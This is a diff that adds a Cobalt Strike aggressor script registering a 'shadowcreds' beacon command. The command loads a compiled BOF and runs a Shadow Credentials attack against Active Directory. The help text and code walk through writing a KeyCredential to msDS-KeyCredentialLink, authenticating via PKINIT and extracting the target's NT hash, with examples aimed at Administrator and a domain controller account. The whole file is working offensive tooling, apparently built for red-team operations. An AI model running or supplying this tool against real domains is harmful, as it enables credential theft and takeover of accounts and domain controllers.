@@ -1,0 +1,66 @@
+# Shadow Credentials BOF - Aggressor Script
+#
+# Cobalt Strike aggressor script for shadowcreds BOF
+#
+# Usage: shadowcreds <target> <domain> [kdc]
+#
+# Example: shadowcreds Administrator corp.local dc01.corp.local
+
+beacon_command_register(
+    "shadowcreds",
+    "Execute Shadow Credentials attack - write msDS-KeyCredentialLink and obtain NT hash via PKINIT",
+    "Usage: shadowcreds <target> <domain> [kdc]\n\n" .
+    "Performs a Shadow Credentials attack against the target:\n" .
+    "  1. Generates RSA keypair and self-signed certificate\n" .
+    "  2. Writes KeyCredential to msDS-KeyCredentialLink\n" .
+    "  3. Authenticates via PKINIT\n" .
+    "  4. Extracts NT hash from PAC credentials\n\n" .
+    "Arguments:\n" .
+    "  target - sAMAccountName of target user/computer\n" .
+    "  domain - Domain FQDN (e.g., corp.local)\n" .
+    "  kdc    - Optional: Domain Controller hostname/IP\n\n" .
+    "Examples:\n" .
+    "  shadowcreds Administrator corp.local\n" .
+    "  shadowcreds DC01$ corp.local dc01.corp.local"
+);
+
+alias shadowcreds {
+    local('$barch $handle $data $args');
+
+    if (size(@_) < 3) {
+        berror($1, "Usage: shadowcreds <target> <domain> [kdc]");
+        return;
+    }
+
+    $barch = barch($1);
+
+    # Select the correct architecture
+    if ($barch eq "x64") {
+        $handle = openf(script_resource("build/shadowcreds.x64.o"));
+    }
+    else {
+        $handle = openf(script_resource("build/shadowcreds.x86.o"));
+    }
+
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($1, "Could not read BOF file. Run 'make bof' first.");
+        return;
+    }
+
+    # Pack arguments: target, domain, kdc
+    $target = $2;
+    $domain = $3;
+    $kdc = iff(size(@_) >= 4, $4, "");
+
+    $args = bof_pack($1, "zzz", $target, $domain, $kdc);
+
+    # Execute BOF
+    blog($1, "[*] Shadow Credentials attack against: " . $target);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# Havoc-compatible command (if using Havoc instead of CS)
+# Command registration is the same, just adjust path as needed
